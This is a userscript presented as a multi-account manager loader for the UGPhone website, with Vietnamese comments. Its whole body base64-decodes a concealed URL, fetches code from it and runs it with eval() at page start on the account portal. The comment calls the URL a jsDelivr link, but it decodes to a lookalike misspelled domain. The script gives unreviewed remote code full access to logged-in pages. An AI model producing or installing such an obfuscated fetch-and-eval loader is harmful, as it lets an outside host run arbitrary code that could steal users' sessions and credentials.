// ==UserScript==
// @name         Multi-Tab Account Manager for UGPhone (Loader)
// @namespace    minhbeo8-ugphone
// @version      1.0.8
// @description  Quản lý nhiều local ugphone 
// @author       Minhbeo8(hominz) 
// @supportURL   https://discord.gg/XK8qsgrF
// @icon         https://i.postimg.cc/Jhcr8R5L/hominz-png-4.png
// @match        https://www.ugphone.com/*
// @match        https://ugphone.com/*
// @match        https://www.ugphone.com/toc-portal/*
// @match        https://ugphone.com/toc-portal/*
// @grant        GM_xmlhttpRequest
// @grant        GM_info
// @grant        GM_addStyle
// @grant        GM_getValue
// @grant        GM_setValue
// @grant        GM_deleteValue
// @grant        GM_listValues
// @run-at       document-start
// ==/UserScript==

(function() {
    'use strict';
    function decodeBase64(e) {
        try { return atob(e); } catch (e) { return ""; }
    }
    // Link jsDelivr mã hóa base64
    const sourceUrl = decodeBase64(
        "aHR0cHM6Ly9jZG4uanNkbGV2ci5uZXQvZ2gvTWluaGJlbzgvZXh0ZW5zaW9uX211bHRpX0Jyb3dzZXJAbWFpbi9leHRlbnNpb24="
    );
    GM_xmlhttpRequest({
        method: "GET",
        url: sourceUrl,
        onload: function(response) {
            if (response.status === 200) {
                eval(response.responseText);
            } else {
                alert("Không tải được mã nguồn chính: " + response.status);
            }
        },
        onerror: function() {
            alert("Có lỗi khi tải mã nguồn chính!");
        }
    });
})();
